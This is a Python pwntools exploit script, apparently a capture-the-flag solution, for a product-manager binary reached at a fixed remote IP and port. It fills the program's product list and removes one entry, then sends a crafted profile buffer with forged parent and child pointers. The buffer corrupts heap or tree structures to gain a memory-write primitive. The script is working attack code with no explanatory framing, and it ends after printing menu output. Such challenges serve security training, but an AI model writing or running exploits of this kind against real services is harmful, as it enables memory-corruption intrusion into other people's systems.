import pwn

#r = pwn.process('./prodmanager_4d8d279676a55c81940198a31d8bc2f7')
r = pwn.remote("52.5.68.190", 4667)

def add_product(name, price):
    r.recvuntil('Input: ')
    r.send('1\n')
    r.recvuntil('name: ')
    r.send(name + '\n') 
    r.recvuntil('price: ')
    r.send(str(price) + '\n')
    assert 'Success' in r.recvuntil('!')

def manage_product(name):
    r.recvuntil('Input: ')
    r.send('3\n')
    r.recvuntil('add: ')
    r.send(name + '\n')
    res = r.recvuntil('!')
    print res
    assert 'success' in res

def remove_product(name):
    r.recvuntil('Input: ')
    r.send('2\n')
    r.recvuntil('remove: ')
    r.send(name + '\n')
    assert 'success' in r.recvuntil('!')

def profile(data):
    assert '\n' not in data
    r.recvuntil('Input: ')
    r.send('5\n')
    r.recvuntil('!')
    r.send(data + '\n')
    assert 'created' in r.recvuntil('!')


add_product('a', 10)
add_product('b', 11)
add_product('c', 12)
add_product('d', 13)
add_product('e', 14)
add_product('f', 15)

manage_product('a')
manage_product('b')
manage_product('c')
manage_product('d')
manage_product('e')
manage_product('f')

remove_product('d')
buf = ''
buf += pwn.p32(9)  # price
buf += pwn.p32(0xdeadbeef)  # next
buf += pwn.p32(0xdeadbeef)  # prev
buf += pwn.p32(0x804C1C0)  # parent
buf += pwn.p32(0x804C3E0-24)  # left
buf += pwn.p32(0x804C3E0-24)  # right
buf += pwn.cyclic(8) + 'BBBB'
profile(buf)

r.recvuntil('Input: ')
r.send('4\n')
print r.recvuntil('Input: ')
r.send('4\n')
print r.recvuntil('Input: ')

